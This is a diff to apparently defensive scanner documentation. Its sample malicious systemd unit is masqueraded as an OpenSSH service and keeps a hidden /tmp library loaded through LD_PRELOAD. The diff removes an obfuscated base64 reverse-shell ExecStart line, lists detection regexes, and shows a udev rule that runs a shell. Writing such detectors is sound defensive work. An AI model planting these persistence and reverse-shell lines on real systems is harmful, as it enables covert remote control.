@@ -78,12 +78,13 @@ ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth0", RUN+="/bin/sh -c 'echo \"python
 
 ```
 [Unit]
-Description=System Security Monitor
+Description=OpenSSH Daemon Service
+After=network.target
 
 [Service]
 Type=simple
 Environment="LD_PRELOAD=/tmp/.libhook.so"
-ExecStart=/bin/bash -c 'echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xIDQ0NDQ=" | base64 -d | bash'
+ExecStart=/usr/sbin/sshd -D
 Restart=always
 
 [Install]
@@ -91,8 +92,6 @@ WantedBy=multi-user.target
 ```
 
 **Matched Indicators (`rules.json`):**
-* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) — *Triggered via ExecStart field*
-* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) — *Triggered via ExecStart field*
 * `LD_PRELOAD` — **CRITICAL** (*Shared library preloading injection*) — *Triggered via Environment field*
 * `(/tmp|/dev/shm|/var/tmp|/run/user(/[0-9]+)?)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*) — *Triggered via Environment field*
 
